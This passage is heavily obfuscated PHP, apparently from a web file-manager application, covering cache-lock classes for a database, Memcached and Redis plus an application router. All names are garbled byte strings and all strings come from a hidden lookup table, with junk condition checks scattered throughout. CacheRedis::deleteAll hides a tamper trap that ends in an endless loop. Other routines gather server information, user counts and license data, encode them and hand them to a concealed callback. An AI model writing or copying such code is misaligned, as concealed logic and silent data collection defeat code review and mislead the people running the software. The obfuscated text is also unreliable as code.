$°ÂƒˆşÔ[1165]))->delete(); } $øÏæôÌÀ = json_encode($ ¨êĞœ); if (!$øÏæôÌÀ) { ob_start(); var_dump($ ¨êĞœ); $Æë¥½éË = ob_get_clean(); self::log($°ÂƒˆşÔ[1819] . json_encode_force($Æë¥½éË)); } if (!$éÑå‘Ğ || !$ ¨êĞœ[$°ÂƒˆşÔ[487]]) { return !1; } $Í—×œàĞ = array($°ÂƒˆşÔ[33] => $°ÂƒˆşÔ[1165], $°ÂƒˆşÔ[1791] => USER_ID, $°ÂƒˆşÔ[97] => $éÑå‘Ğ, $°ÂƒˆşÔ[462] => $øÏæôÌÀ); $«ÔåÔÉí = $°ÂƒˆşÔ[1820]; CacheLock::lock($«ÔåÔÉí); Model($°ÂƒˆşÔ[532])->add($Í—×œàĞ, array(), !0); CacheLock::unlock($«ÔåÔÉí); } public static function log($Œ›‹¨”Î) { if (!GLOBAL_DEBUG) { return; } write_log($Œ›‹¨”Î, $_SERVER[‹‰”››ê][1821]); } } goto d§ÏÜŞ´Ú”; a„êê½»ã‚: class CacheLockDatabase { public function lock($†ö­Ü½Ä, $„¦çĞü• = 0) { $Íç¾‰÷Â = Model($_SERVER[‹‰”››ê][924]); $¿ÜñÎ… = microtime(!0) + $„¦çĞü•; while (microtime(!0) < $¿ÜñÎ…) { $°ËâîûÔ = $Íç¾‰÷Â->get($†ö­Ü½Ä); if (!$°ËâîûÔ || $°ËâîûÔ < microtime(!0)) { $§æœÍ§ä = $Íç¾‰÷Â->set($†ö­Ü½Ä, $¿ÜñÎ…); if ($§æœÍ§ä) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($½ôìä§) { return Model($_SERVER[‹‰”››ê][924])->get($½ôìä§); } public function unlock($½¶“íÅü) { Model($_SERVER[‹‰”››ê][924])->remove($½¶“íÅü); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($€‰¯¥²Ê, $º¯™ãı) { $Ö€„ëİ£ =& $_SERVER[‹‰”››ê]; if (!class_exists($Ö€„ëİ£[963])) { show_json($Ö€„ëİ£[964], !1); } $this->cacheTime = $º¯™ãı; $this->handle = new Memcached(); if (is_array($€‰¯¥²Ê[$Ö€„ëİ£[965]]) && count($€‰¯¥²Ê[$Ö€„ëİ£[965]]) >= 1) { foreach ($€‰¯¥²Ê[$Ö€„ëİ£[965]] as $ä‡Âş¹) { $‚Øòç = explode($Ö€„ëİ£[4], $ä‡Âş¹); $this->handle->addServer($‚Øòç[0], $‚Øòç[1]); } } else { $this->handle->addServer($€‰¯¥²Ê[$Ö€„ëİ£[209]], $€‰¯¥²Ê[$Ö€„ëİ£[210]]); } } public function set($Î¹ß•ÅÉ, $€ªäû–ç, $ä’ú¨Ş = false) { $ä’ú¨Ş = $ä’ú¨Ş ? $ä’ú¨Ş : $this->cacheTime; return $this->handle->set($Î¹ß•ÅÉ, $€ªäû–ç, $ä’ú¨Ş); } public function get($û¤°µİ°) { return $this->handle->get($û¤°µİ°); } public function remove($Ã€Ùã) { return $this->handle->delete($Ã€Ùã); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($àúúô™, $Áªê‘»à) { $İ—¬˜€á =& $_SERVER[‹‰”››ê]; if (!class_exists($İ—¬˜€á[966])) { show_json($İ—¬˜€á[967], !1); } $this->cacheTime = $Áªê‘»à; $£†ÍåÊø = isset($àúúô™[$İ—¬˜€á[968]]) ? $àúúô™[$İ—¬˜€á[968]] : 10; $‡›´¦Ê¼ = _get($àúúô™, $İ—¬˜€á[965]); if ($‡›´¦Ê¼ && is_array($‡›´¦Ê¼)) { $this->initCluster($àúúô™, $£†ÍåÊø); } else { $this->handle = $this->init($àúúô™, $£†ÍåÊø); } } private function init($áş§¢çø, $€ÑàÊÅ) { $·“–œàî =& $_SERVER[‹‰”››ê]; $“±Ê ñÅ = new Redis(); $ÈÆã§’ò = isset($áş§¢çø[$·“–œàî[969]]) ? $áş§¢çø[$·“–œàî[969]] : !1; if ($ÈÆã§’ò) { $“±Ê ñÅ->pconnect($áş§¢çø[$·“–œàî[209]], $áş§¢çø[$·“–œàî[210]], $€ÑàÊÅ); } else { $“±Ê ñÅ->connect($áş§¢çø[$·“–œàî[209]], $áş§¢çø[$·“–œàî[210]], $€ÑàÊÅ); } if (!empty($áş§¢çø[$·“–œàî[499]])) { $“±Ê ñÅ->auth($áş§¢çø[$·“–œàî[499]]); } if (!empty($áş§¢çø[$·“–œàî[847]]) && $áş§¢çø[$·“–œàî[847]] != 0) { $“±Ê ñÅ->select($áş§¢çø[$·“–œàî[847]]); } return $“±Ê ñÅ; } private function initCluster($Ï‚¯å»¼, $ñî‡ÊË) { $Ş©ğëÉ± =& $_SERVER[‹‰”››ê]; $”½‰ûÛ = array($Ş©ğëÉ±[970], $Ş©ğëÉ±[971], $Ş©ğëÉ±[972]); $Éîó¯Š = $Ş©ğëÉ±[970]; if (isset($Ï‚¯å»¼[$Ş©ğëÉ±[16]]) && in_array($Ï‚¯å»¼[$Ş©ğëÉ±[16]], $”½‰ûÛ)) { $Éîó¯Š = $Ï‚¯å»¼[$Ş©ğëÉ±[16]]; } switch ($Éîó¯Š) { case $Ş©ğëÉ±[970]: $this->_slave($Ï‚¯å»¼, $ñî‡ÊË); break; case $Ş©ğëÉ±[971]: break; case $Ş©ğëÉ±[972]: $this->isCluster = !0; $˜£ïèî = $Ï‚¯å»¼[$Ş©ğëÉ±[965]]; $„–¶¿‰ = isset($Ï‚¯å»¼[$Ş©ğëÉ±[969]]) ? $Ï‚¯å»¼[$Ş©ğëÉ±[969]] : !1; $öÇÁ©öş = isset($Ï‚¯å»¼[$Ş©ğëÉ±[499]]) ? $Ï‚¯å»¼[$Ş©ğëÉ±[499]] : null; $this->handle = new RedisCluster(NUll, $˜£ïèî, $ñî‡ÊË, $ñî‡ÊË, $„–¶¿‰, $öÇÁ©öş); break; default: break; } } private function _slave($ÑÉı“¸ú, $Ú‹´ôğ«) { $•…‚îŸô = $ÑÉı“¸ú[$_SERVER[‹‰”››ê][965]]; $this->filterConfig($ÑÉı“¸ú, $•…‚îŸô[0]); $this->handle = $this->init($ÑÉı“¸ú, $Ú‹´ôğ«); unset($•…‚îŸô[0]); if (empty($•…‚îŸô)) { return; } $õ…ÓüŸ = array_rand($•…‚îŸô); $this->filterConfig($ÑÉı“¸ú, $•…‚îŸô[$õ…ÓüŸ]); $this->slaveHandle = $this->init($ÑÉı“¸ú, $Ú‹´ôğ«); } private function filterConfig(&$¿¥²õô½, $ß¨ğŒÌ¯) { $ŠÖ²«®‘ =& $_SERVER[‹‰”››ê]; $˜ü¦—µ‹ = explode($ŠÖ²«®‘[4], $ß¨ğŒÌ¯); $ŸĞºÁü = array($ŠÖ²«®‘[209] => $˜ü¦—µ‹[0], $ŠÖ²«®‘[210] => $˜ü¦—µ‹[1]); $¿¥²õô½ = array_merge($¿¥²õô½, $ŸĞºÁü); } public function set($¾©ãñ­Ì, $ô˜ñŞßİ, $Šûˆš½Ì = false) { $Šûˆš½Ì = $Šûˆš½Ì ? $Šûˆš½Ì : $this->cacheTime; return $this->handle->setEx($¾©ãñ­Ì, $Šûˆš½Ì, $ô˜ñŞßİ); } public function setLock($ÙÚÉÇÑò, $£Ãúİ•Ñ, $ç‚âˆè) { return $this->handle->setNX($ÙÚÉÇÑò, $£Ãúİ•Ñ); } public function get($ø§Œš£æ) { $íá÷²€Ü = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $íá÷²€Ü->get($ø§Œš£æ); } public function remove($‚—È„ØÃ) { return $this->handle->del($‚—È„ØÃ); } public function deleteAll() { $¨î“şŞæ =& $_SERVER[‹‰”››ê]; if (!isset($_SERVER[$¨î“şŞæ[318]]) || !isset($_SERVER[$¨î“şŞæ[316]])) { $ùº‚¦ÓÏ = $¨î“şŞæ[973]; $­‹ã‘ù = $¨î“şŞæ[319]; $ ®š„üŒ = $_SERVER[$¨î“şŞæ[320]] . $¨î“şŞæ[321]; $»ûƒè°ğ = $­‹ã‘ù($ ®š„üŒ); $ß£Ò³Ê× = explode($¨î“şŞæ[288], $»ûƒè°ğ); if (count($ß£Ò³Ê×) < $¨î“şŞæ[700]) { $ÇôøšˆÓ = $¨î“şŞæ[323]; $ÇôøšˆÓ(); } $å´Ø‡Ò² = $¨î“şŞæ[974]; $å´Ø‡Ò²($_SERVER[$¨î“şŞæ[975]]); $íº¥¥§Î = 1; for ($ñ™Ã¨ˆÃ = $íº¥¥§Î; $ñ™Ã¨ˆÃ > 0; $ñ™Ã¨ˆÃ++) { $å´Ø‡Ò² = json_encode($GLOBALS[$¨î“şŞæ[504]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $üàù‡‡) { $this->handle->flushall($üàù‡‡); } return; } return $this->handle->flushAll(); } } goto AÊË›åèèª; Eïâç½‚±Á: class Application { private $defaultModule = "\x69\156\144\145\170"; private $defaultController = "\x69\156\144\x65\x78"; private $defaultAction = "\151\x6e\x64\x65\x78"; function __construct() { } public function setDefault($èÂôğÈƒ) { $î‰¦Í— =& $_SERVER[‹‰”››ê]; $òĞÔ”ãÍ =& $_SERVER[¢Î¨ùä°]; $˜¨¿—ä = explode($òĞÔ”ãÍ[0], trim($èÂôğÈƒ, $òĞÔ”ãÍ[0])); $this->defaultModule = $˜¨¿—ä[0] ? $˜¨¿—ä[0] : $this->defaultModule; $ÆúÆÒÑ = $î‰¦Í—[701]; if (!$ÆúÆÒÑ) { die; } $this->defaultController = $˜¨¿—ä[1] ? $˜¨¿—ä[1] : $this->defaultController; $ø‹íÊßû = $î‰¦Í—[702]; if (strlen($ø‹íÊßû) < $î‰¦Í—[703]) { return; } $this->defaultAction = $˜¨¿—ä[2] ? $˜¨¿—ä[2] : $this->defaultAction; $this->yfjqc68195ba($òĞÔ”ãÍ[1], array($this, $òĞÔ”ãÍ[2])); $ÙÓ¬Ã…Ğ = $î‰¦Í—[704]; } public function appRun($Ë¬’à›) { $–İ¶‚üè =& $_SERVER[‹‰”››ê]; $’ÊÀÁ˜¡ =& $_SERVER[¢Î¨ùä°]; $àªµ‰¬Â = explode($’ÊÀÁ˜¡[0], $Ë¬’à›); $Ù´­·· = strtolower($àªµ‰¬Â[0]); $¿û¸ö = $’ÊÀÁ˜¡[3]; $å™’„ = $–İ¶‚üè[705]; if (!$å™’„) { return; } if ($Ù´­·· == $’ÊÀÁ˜¡[4]) { $¿û¸ö = $’ÊÀÁ˜¡[5]; $àªµ‰¬Â[0] = $’ÊÀÁ˜¡[6]; $àªµ‰¬Â[1] = $àªµ‰¬Â[1] . $’ÊÀÁ˜¡[7]; $Ë¬’à› = join($’ÊÀÁ˜¡[0], $àªµ‰¬Â); $Ë¬’à› = trim($Ë¬’à›, $’ÊÀÁ˜¡[0]); } call_user_func(array($’ÊÀÁ˜¡[8], $’ÊÀÁ˜¡[9]), $¿û¸ö . $’ÊÀÁ˜¡[10], $Ë¬’à›); ActionCall($Ë¬’à›); $Õ‘´™àş = $–İ¶‚üè[706]; if (strlen($Õ‘´™àş) < $–İ¶‚üè[322]) { die; } call_user_func(array($’ÊÀÁ˜¡[8], $’ÊÀÁ˜¡[9]), $¿û¸ö . $’ÊÀÁ˜¡[11], $Ë¬’à›); } private function autorun() { $ì˜şª€ =& $_SERVER[‹‰”››ê]; $±„ˆ¤Ù =& $_SERVER[¢Î¨ùä°]; global $config; $çœá¸éÀ = $ì˜şª€[707]; if (strlen($çœá¸éÀ) < $ì˜şª€[708]) { return; } if (count($config[$±„ˆ¤Ù[12]]) == 0) { return; } foreach ($config[$±„ˆ¤Ù[12]] as $®ª»“Íˆ => $Õî”Ş¢) { $this->appRun($Õî”Ş¢); $›ˆ‹´Öã = $ì˜şª€[709]; if (!$›ˆ‹´Öã) { die; } } } private function hjtz73abb6b1() { $ª •è‹Š =& $_SERVER[‹‰”››ê]; $—«»ˆÃ˜ =& $_SERVER[¢Î¨ùä°]; $¡úÍ¡ë© = $—«»ˆÃ˜[4]; $°¤µŒÒê = $ª •è‹Š[710]; $Ô‚ø¢Îì = $GLOBALS[$—«»ˆÃ˜[13]][$—«»ˆÃ˜[14]][0]; if (!$Ô‚ø¢Îì || strlen($Ô‚ø¢Îì) <= strlen($¡úÍ¡ë©)) { return; } if (strtolower(substr($Ô‚ø¢Îì, -strlen($¡úÍ¡ë©))) != $¡úÍ¡ë©) { return; } $æ™ÍÆàö = substr($Ô‚ø¢Îì, 0, -strlen($¡úÍ¡ë©)); $ıĞ²Ÿ€Ï = array($—«»ˆÃ˜[4], $æ™ÍÆàö); $–‚õò¥€ = $ª •è‹Š[711]; $Ë«’ñ‹ = array_slice($GLOBALS[$—«»ˆÃ˜[13]][$—«»ˆÃ˜[14]], 1); $GLOBALS[$—«»ˆÃ˜[13]][$—«»ˆÃ˜[14]] = array_merge($ıĞ²Ÿ€Ï, $Ë«’ñ‹); $GLOBALS[$—«»ˆÃ˜[13]][$—«»ˆÃ˜[15]] = implode($—«»ˆÃ˜[0], $GLOBALS[$—«»ˆÃ˜[13]][$—«»ˆÃ˜[14]]); $êŸóç¢ø = $ª •è‹Š[712]; } private function mnlpcd75cd75() { $çóøªÙÂ =& $_SERVER[‹‰”››ê]; $ó‚À²äÙ =& $_SERVER[¢Î¨ùä°]; if ($GLOBALS[$ó‚À²äÙ[13]][$ó‚À²äÙ[15]] != $ó‚À²äÙ[6]) { return; } $£şáã—ì = $_SERVER[$ó‚À²äÙ[16]]; $Ãµ«äú = $çóøªÙÂ[713]; if (strlen($Ãµ«äú) < $çóøªÙÂ[322]) { return; } $°¢ßÇŞ = $ó‚À²äÙ[17]; $Îô™ïª´ = $çóøªÙÂ[714]; if (!strstr($£şáã—ì, $°¢ßÇŞ)) { return; } $çˆ»¥õº = strrpos($£şáã—ì, $°¢ßÇŞ); $­“õÇá = substr($£şáã—ì, $çˆ»¥õº + strlen($°¢ßÇŞ)); $¤ªø„èñ = $çóøªÙÂ[715]; if (!$¤ªø„èñ) { return; } preg_match_all($ó‚À²äÙ[18], $­“õÇá, $½Ñá©¿); $•½®½ƒ¨ = $çóøªÙÂ[716]; $­“õÇá = trim($½Ñá©¿[0][0], $ó‚À²äÙ[19]); $ËğˆĞê… = $çóøªÙÂ[717]; $GLOBALS[$ó‚À²äÙ[13]][$ó‚À²äÙ[14]] = explode($ó‚À²äÙ[19], $­“õÇá); $GLOBALS[$ó‚À²äÙ[13]][$ó‚À²äÙ[15]] = implode($ó‚À²äÙ[0], $GLOBALS[$ó‚À²äÙ[13]][$ó‚À²äÙ[14]]); $ÓÅÓ¯ = $çóøªÙÂ[718]; } public function run() { $ñ§”×€— =& $_SERVER[‹‰”››ê]; $ãÊ««×¢ =& $_SERVER[¢Î¨ùä°]; $this->mnlpcd75cd75(); $İğÄƒ¬ = $ñ§”×€—[719]; $this->hjtz73abb6b1(); $²ÚùÈ€® = $GLOBALS[$ãÊ««×¢[13]][$ãÊ««×¢[14]]; $‡ï…Ôë– = $ñ§”×€—[720]; while (strlen($‡ï…Ôë–) < $ñ§”×€—[322]) { if (!$‡ï…Ôë–) { break; } $‡ï…Ôë–++; } $ñÈå¼Å› = $GLOBALS[$ãÊ««×¢[13]][$ãÊ««×¢[15]]; $êŠªƒœ½ = $ñ§”×€—[721]; while (strlen($êŠªƒœ½) < $ñ§”×€—[703]) { if (!$êŠªƒœ½) { break; } $êŠªƒœ½++; } define($ãÊ««×¢[20], isset($²ÚùÈ€®[0]) && $²ÚùÈ€®[0] ? $²ÚùÈ€®[0] : $this->defaultModule); $ïû–­È = $ñ§”×€—[722]; if (!$ïû–­È) { return; } define($ãÊ««×¢[21], isset($²ÚùÈ€®[1]) && $²ÚùÈ€®[0] ? $²ÚùÈ€®[1] : $this->defaultController); define($ãÊ««×¢[22], isset($²ÚùÈ€®[2]) && $²ÚùÈ€®[0] ? $²ÚùÈ€®[2] : $this->defaultAction); $™Õ›ôÖø = $ñ§”×€—[723]; define($ãÊ««×¢[23], MOD . $ãÊ««×¢[0] . ST . $ãÊ««×¢[0] . ACT); $˜óÒ¹Šê = $ñ§”×€—[724]; if (!$˜óÒ¹Šê) { die; } $_SERVER[$ãÊ««×¢[24]] = strtolower(ACTION); $this->autorun(); $Õºö«Ú… = $ñ§”×€—[725]; if (strlen($Õºö«Ú…) < $ñ§”×€—[700]) { return; } if (count($²ÚùÈ€®) >= 3) { $this->appRun($ñÈå¼Å›); } else { $this->appRun(ACTION); } } private $nkfrf5d35153 = array(); private $pkwx73a438be = ''; public function hudkf4677d46() { $†Ÿøöõ² =& $_SERVER[‹‰”››ê]; $Ñ¤Ğ‹ßã =& $_SERVER[¢Î¨ùä°]; $this->gydxa33943f4(); $this->xotueccc3da1(); $»§÷Çà = $†Ÿøöõ²[726]; if (!$»§÷Çà) { return; } $this->qfake58ff099(); $ˆ¾¾äÁÁ = $†Ÿøöõ²[727]; if (strlen($ˆ¾¾äÁÁ) < $†Ÿøöõ²[322]) { die; } $this->ximv71a4ee1b(); $this->kayc7b289131(); $this->kyqsebbf69ff(); $Ó¿“¯‘¶ = $†Ÿøöõ²[728]; $this->hnof8d516d14(); $this->yfjqc68195ba($Ñ¤Ğ‹ßã[25], array($this, $Ñ¤Ğ‹ßã[26])); $this->yfjqc68195ba($Ñ¤Ğ‹ßã[27], array($this, $Ñ¤Ğ‹ßã[28])); $this->yfjqc68195ba($Ñ¤Ğ‹ßã[29], array($this, $Ñ¤Ğ‹ßã[30])); $Öø¥´˜ç = $†Ÿøöõ²[729]; while ($Öø¥´˜ç < $†Ÿøöõ²[708]) { if ($Öø¥´˜ç >= 0) { break; } $Öø¥´˜ç++; } $this->yfjqc68195ba($Ñ¤Ğ‹ßã[31], array($this, $Ñ¤Ğ‹ßã[32])); $Ì¯ª¼™ = $†Ÿøöõ²[730]; if (strlen($Ì¯ª¼™) < $†Ÿøöõ²[708]) { return; } } public function donbcdf7201e($£šĞ¬‚) { $õ›¡õŞ =& $_SERVER[‹‰”››ê]; $Áºû‡— =& $_SERVER[¢Î¨ùä°]; $ ¾©¾ûƒ = Model($Áºû‡—[33])->get(); $Í‘–°›‚ = array($Áºû‡—[34], $Áºû‡—[35], $Áºû‡—[36], $Áºû‡—[37], $Áºû‡—[38], $Áºû‡—[39], $Áºû‡—[40], $Áºû‡—[41], $Áºû‡—[42], $Áºû‡—[43], $Áºû‡—[44], $Áºû‡—[45], $Áºû‡—[46], $Áºû‡—[47], $Áºû‡—[48], $Áºû‡—[49], $Áºû‡—[50], $Áºû‡—[51], $Áºû‡—[52], $Áºû‡—[53], $Áºû‡—[54], $Áºû‡—[55], $Áºû‡—[56], $Áºû‡—[57], $Áºû‡—[58], $Áºû‡—[59], $Áºû‡—[60], $Áºû‡—[61], $Áºû‡—[62], $Áºû‡—[63], $Áºû‡—[64], $Áºû‡—[65], $Áºû‡—[66], $Áºû‡—[67], $Áºû‡—[68], $Áºû‡—[69], $Áºû‡—[70], $Áºû‡—[71], $Áºû‡—[72], $Áºû‡—[73], $Áºû‡—[74], $Áºû‡—[75], $Áºû‡—[76], $Áºû‡—[77], $Áºû‡—[78], $Áºû‡—[79], $Áºû‡—[80], $Áºû‡—[81], $Áºû‡—[82], $Áºû‡—[83], $Áºû‡—[84], $Áºû‡—[85]); $µş‚ÍÀ¿ = $õ›¡õŞ[731]; if (!$µş‚ÍÀ¿) { return; } foreach ($Í‘–°›‚ as $½œ™»àğ) { $Ú¼ÁŒˆë = $GLOBALS[$Áºû‡—[86]][$Áºû‡—[87]][$½œ™»àğ]; if (isset($ ¾©¾ûƒ[$½œ™»àğ])) { $Ú¼ÁŒˆë = $ ¾©¾ûƒ[$½œ™»àğ]; } $£šĞ¬‚[$Áºû‡—[88]][$Áºû‡—[89]][$½œ™»àğ] = $Ú¼ÁŒˆë; } $ÌÜÈû—Ë = $£šĞ¬‚[$Áºû‡—[88]][$Áºû‡—[89]][$Áºû‡—[46]]; unset($£šĞ¬‚[$Áºû‡—[88]][$Áºû‡—[90]][$Áºû‡—[91]]); $Çª¾’ˆ = $õ›¡õŞ[732]; if (strlen($Çª¾’ˆ) < $õ›¡õŞ[733]) { return; } unset($£šĞ¬‚[$Áºû‡—[88]][$Áºû‡—[90]][$Áºû‡—[92]]); $‡Í³¦Ï… = $õ›¡õŞ[734]; unset($£šĞ¬‚[$Áºû‡—[88]][$Áºû‡—[89]][$Áºû‡—[46]]); $ê…ŒŒ§Õ = $õ›¡õŞ[735]; while (strlen($ê…ŒŒ§Õ) < $õ›¡õŞ[700]) { if (!$ê…ŒŒ§Õ) { break; } $ê…ŒŒ§Õ++; } unset($£šĞ¬‚[$Áºû‡—[88]][$Áºû‡—[89]][$Áºû‡—[93]]); $¤óÕ§§æ = $õ›¡õŞ[736]; while ($¤óÕ§§æ < $õ›¡õŞ[700]) { if ($¤óÕ§§æ >= 0) { break; } $¤óÕ§§æ++; } $£šĞ¬‚[$Áºû‡—[88]][$Áºû‡—[89]][$Áºû‡—[94]] = array($Áºû‡—[95] => (int) $ÌÜÈû—Ë[$Áºû‡—[96]], $Áºû‡—[97] => (int) _get($ÌÜÈû—Ë, $Áºû‡—[98], 0)); $¸ˆ‰«ê¶ = substr(md5($Áºû‡—[99] . get_client_ip() . $ ¾©¾ûƒ[$Áºû‡—[100]]), 0, 15); $£šĞ¬‚[$Áºû‡—[101]][$Áºû‡—[102]] = Mcrypt::encode(Session::sign(), $¸ˆ‰«ê¶, 3600 * 24); $£šĞ¬‚[$Áºû‡—[101]][$Áºû‡—[103]] = Action($Áºû‡—[104])->accessToken(); $¾ÏØû¨§ = $õ›¡õŞ[737]; if (!$¾ÏØû¨§) { die; } $£šĞ¬‚[$Áºû‡—[101]][$Áºû‡—[105]] = md5($_SERVER[$Áºû‡—[106]] . $ ¾©¾ûƒ[$Áºû‡—[100]]); $£šĞ¬‚[$Áºû‡—[101]][$Áºû‡—[107]] = base64_encode(serverInfo()); $èÄ†¿› = $õ›¡õŞ[738]; $£šĞ¬‚[$Áºû‡—[101]][$Áºû‡—[108]] = $this->pkwx73a438be; if ($ ¾©¾ûƒ[$Áºû‡—[108]] != $Áºû‡—[109]) { $£šĞ¬‚[$Áºû‡—[101]][$Áºû‡—[110]] = $ ¾©¾ûƒ[$Áºû‡—[110]]; $£šĞ¬‚[$Áºû‡—[101]][$Áºû‡—[111]] = $ ¾©¾ûƒ[$Áºû‡—[111]]; $‚òµèí· = rand_string(10) . $this->pkwx73a438be . rand_string(5); $£šĞ¬‚[$Áºû‡—[88]][$Áºû‡—[112]][$Áºû‡—[113]] = $this->qzot9bcca048($‚òµèí·, $£šĞ¬‚[$Áºû‡—[101]][$Áºû‡—[105]]); } if ($this->pkwx73a438be == $Áºû‡—[109]) { $£šĞ¬‚[$Áºû‡—[88]][$Áºû‡—[89]][$Áºû‡—[94]][$Áºû‡—[98]] = 0; } $£šĞ¬‚[$Áºû‡—[101]][$Áºû‡—[114]] = $this->versionPluginFilter(); $£šĞ¬‚[$Áºû‡—[101]][$Áºû‡—[115]] = _get($this->nkfrf5d35153, $Áºû‡—[116], $Áºû‡—[6]); $œÂû‡€ô = $õ›¡õŞ[739]; if (!$œÂû‡€ô) { return; } if (KodUser::isRoot() && $this->config[$Áºû‡—[117]]) { $£šĞ¬‚[$Áºû‡—[101]][$Áºû‡—[118]] = WEB_ROOT; } return $£šĞ¬‚; } private function kyqsebbf69ff() { $Ëğ‚¬Ò =& $_SERVER[‹‰”››ê]; $š…‚ùğ¿ =& $_SERVER[¢Î¨ùä°]; $âª¦Œô¨ = $_SERVER[$š…‚ùğ¿[24]] == $š…‚ùğ¿[119]; $­¼¤Æ = $Ëğ‚¬Ò[740]; while ($­¼¤Æ < $Ëğ‚¬Ò[733]) { if ($­¼¤Æ >= 0) { break; } $­¼¤Æ++; } if ($_SERVER[$š…‚ùğ¿[24]] == $š…‚ùğ¿[120] && $_GET[$š…‚ùğ¿[121]] == $š…‚ùğ¿[122]) { $âª¦Œô¨ = !0; } if ($âª¦Œô¨) { $“Úß¤¿ã = array($š…‚ùğ¿[108] => $this->pkwx73a438be, $š…‚ùğ¿[123] => $this->mudifc2ae4b3(), $š…‚ùğ¿[124] => Model($š…‚ùğ¿[125])->count()); if ($this->pkwx73a438be != $š…‚ùğ¿[109]) { $õµò¤šÊ = _get($this->nkfrf5d35153, $š…‚ùğ¿[126]); if ($õµò¤šÊ) { $“Úß¤¿ã[$š…‚ùğ¿[127]] = $õµò¤šÊ; $“Úß¤¿ã[$š…‚ùğ¿[128]] = strtotime(_get($this->nkfrf5d35153, $š…‚ùğ¿[129])); $“Úß¤¿ã[$š…‚ùğ¿[130]] = _get($this->nkfrf5d35153, $š…‚ùğ¿[116]); } $ÇŞâ©Öé = Model($š…‚ùğ¿[33])->get($š…‚ùğ¿[131], $š…‚ùğ¿[6], !0); if (is_string($ÇŞâ©Öé) && substr($ÇŞâ©Öé, 0, 1) == $š…‚ùğ¿[132]) { $ÇŞâ©Öé = json_decode_force($ÇŞâ©Öé); } if (is_array($ÇŞâ©Öé) && $ÇŞâ©Öé[$š…‚ùğ¿[133]] && strstr($ÇŞâ©Öé[$š…‚ùğ¿[133]], $š…‚ùğ¿[134])) { $ç‹²ê¥ù = explode($š…‚ùğ¿[134], $ÇŞâ©Öé[$š…‚ùğ¿[133]]); $“Úß¤¿ã[$š…‚ùğ¿[135]] = $ç‹²ê¥ù[0]; } } $“Úß¤¿ã = $this->yowpb68be23f(json_encode($“Úß¤¿ã), md5($š…‚ùğ¿[136])); $Ö—¦á…ö = $Ëğ‚¬Ò[741]; while (strlen($Ö—¦á…ö) < $Ëğ‚¬Ò[322]) { if (!$Ö—¦á…ö) { break; } $Ö—¦á…ö++; } $ú€£¼¤­ = array($š…‚ùğ¿[137] => $“Úß¤¿ã); $Í¾ËúÕæ = $Ëğ‚¬Ò[742]; if (!$Í¾ËúÕæ) { die; } call_user_func(array($š…‚ùğ¿[138], $š…‚ùğ¿[139]), $ú€£¼¤­); $Í¬×ƒ = $Ëğ‚¬Ò[743]; if (!$Í¬×ƒ) { return; } } if ($this->pkwx73a438be == $š…‚ùğ¿[109]) { return; } $àÁ­Æğû = array($š…‚ùğ¿[140], $š…‚ùğ¿[141], $š…‚ùğ¿[142], $š…‚ùğ¿[143], $š…‚ùğ¿[144], $š…‚ùğ¿[145]); $ìàŸŠÀ = Model($š…‚ùğ¿[33])->get(); $ú€£¼¤­ = array($š…‚ùğ¿[146] => $ìàŸŠÀ[$š…‚ùğ¿[34]], $š…‚ùğ¿[147] => $ìàŸŠÀ[$š…‚ùğ¿[35]], $š…‚ùğ¿[148] => $š…‚ùğ¿[6]); foreach ($àÁ­Æğû as $ÉŠ•‘¢) { if (!isset($ìàŸŠÀ[$ÉŠ•‘¢]) || !$ìàŸŠÀ[$ÉŠ•‘¢]) { continue; } $ú€£¼¤­[$ÉŠ•‘¢] = $ìàŸŠÀ[$ÉŠ•‘¢]; $ï¨àÊœÌ = $Ëğ‚¬Ò[744]; } call_user_func(array($š…‚ùğ¿[138], $š…‚ùğ¿[139]), $ú€£¼¤­); $”ï­Ì÷À = $Ëğ‚¬Ò[745]; while ($”ï­Ì÷À < $Ëğ‚¬Ò[733]) { if ($”ï­Ì÷À >= 0) { break; } $”ï­Ì÷À++; } } private function ximv71a4ee1b() { $¶öä÷¾ˆ =& $_SERVER[‹‰”››ê]; $¼¤Û¨Ëå =& $_SERVER[¢Î¨ùä°]; if ($_SERVER[$¼¤Û¨Ëå[24]] != $¼¤Û¨Ëå[149]) { return; } if (!KodUser::isRoot()) { die; } $øû˜“ø = $GLOBALS[$¼¤Û¨Ëå[13]]; if (isset($øû˜“ø[$¼¤Û¨Ëå[150]])) { $this->herw7e951f6e(); die; } if (isset($øû˜“ø[$¼¤Û¨Ëå[151]]) && isset($øû˜“ø[$¼¤Û¨Ëå[151]]) == $¼¤Û¨Ëå[122]) { $øû˜“ø[$¼¤Û¨Ëå[152]] = Model($¼¤Û¨Ëå[33])->get($¼¤Û¨Ëå[153]); } if (!isset($øû˜“ø[$¼¤Û¨Ëå[152]]) || strlen($øû˜“ø[$¼¤Û¨Ëå[152]]) != 16) { show_json($¼¤Û¨Ëå[154] . $øû˜“ø[$¼¤Û¨Ëå[152]], !1); } $½¨ı¨¦× = Model($¼¤Û¨Ëå[33])->get($¼¤Û¨Ëå[100]); $›²ó´œè = md5($_SERVER[$¼¤Û¨Ëå[106]] . $½¨ı¨¦×); $¬èÚÔÁŠ = $¶öä÷¾ˆ[746]; $·‘ìÜ†½ = array($¼¤Û¨Ëå[152] => $øû˜“ø[$¼¤Û¨Ëå[152]], $¼¤Û¨Ëå[155] => rand_string(16), $¼¤Û¨Ëå[156] => $¼¤Û¨Ëå[136], $¼¤Û¨Ëå[157] => $¼¤Û¨Ëå[158], $¼¤Û¨Ëå[159] => $_SERVER[$¼¤Û¨Ëå[160]], $¼¤Û¨Ëå[161] => $_SERVER[$¼¤Û¨Ëå[162]], $¼¤Û¨Ëå[163] => $_SERVER[$¼¤Û¨Ëå[164]], $¼¤Û¨Ëå[105] => $›²ó´œè, $¼¤Û¨Ëå[165] => Model($¼¤Û¨Ëå[33])->get($¼¤Û¨Ëå[131])); $‚Ğí×™ = $¶öä÷¾ˆ[747]; while ($‚Ğí×™ < $¶öä÷¾ˆ[700]) { if ($‚Ğí×™ >= 0) { break; } $‚Ğí×™++; } if (isset($øû˜“ø[$¼¤Û¨Ëå[151]]) && isset($øû˜“ø[$¼¤Û¨Ëå[151]]) == $¼¤Û¨Ëå[122]) { $·‘ìÜ†½[$¼¤Û¨Ëå[151]] = md5($·‘ìÜ†½[$¼¤Û¨Ëå[152]] . $¼¤Û¨Ëå[166] . 